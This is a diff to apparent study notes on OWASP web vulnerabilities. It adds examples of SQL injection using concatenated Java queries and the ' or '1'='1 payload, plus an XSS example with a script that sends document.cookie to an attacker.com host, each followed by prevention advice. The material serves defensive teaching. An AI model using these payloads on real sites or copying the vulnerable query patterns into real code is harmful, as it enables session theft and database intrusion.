@@ -41,13 +41,23 @@ If the list is provided by user input. We can check that the input string to mat
 Injection flaws can be SQL, NoSQL, OS and LDAP injection.
 These occur when untrusted data is sent to an interpretor as part of a command or query.
 
-We can prevent them by keeping data separate from commands, use of safe API that avoids use of interpretor entirely or provides a parametrized interface to access the interpretor or use of ORMs.
+Example: SQL injection
+```
+String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";
 
+The attacker modifies the ‘id’ parameter value in
+their browser to send: ' or '1'='1
+```
+We can prevent them by keeping data separate from commands, use of safe API that avoids use of interpretor entirely or provides a parametrized interface to access the interpretor or use of ORMs.
 Also we can use positive white list for server side validation.
 
 **Broken Authentication**
 
 It involves using of lists of known passwords to break into systems. Application session timeout when not set properly can also cause failed authentication.
+
+Example:
+Lists of known passwords are used to break into system.
+If there is no automatic threat protection Application can be used to determine if credentials are valid.
 
 Some things to prevent are, using mullti factor authentication.
 Not shipping or deploying with default credentials. Making sure to implement a session timeout.
@@ -56,6 +66,18 @@ Not shipping or deploying with default credentials. Making sure to implement a s
 
 Occurs whenever an application includes untrusted data into a web page without proper validation or escaping. This allows attackers to execute scripts in the victims browser, hijack there user session, redirect them to malicious sites and or deface websites.
 
+Example:
+The application uses untrusted data in the
+construction of the following HTML snippet without validation or escaping:
+```
+(String)page += "<input name='creditcard' type='TEXT'
+value='" + request.getParameter("CC") + "'>";
+
+The attacker modifies the ‘CC’ parameter in the browser to:
+'><script>document.location='http://www.attacker.com/cgi/bin/cookie.cgi?foo=' + document.cookie </script>'
+
+This attack causes the victim’s session ID to be sent to the attacker’s website.
+```
 Prevention involves using frameworks that automatically escape XSS.
 Escaping untrusted HTTP request data based on the context in the HTML output.
 
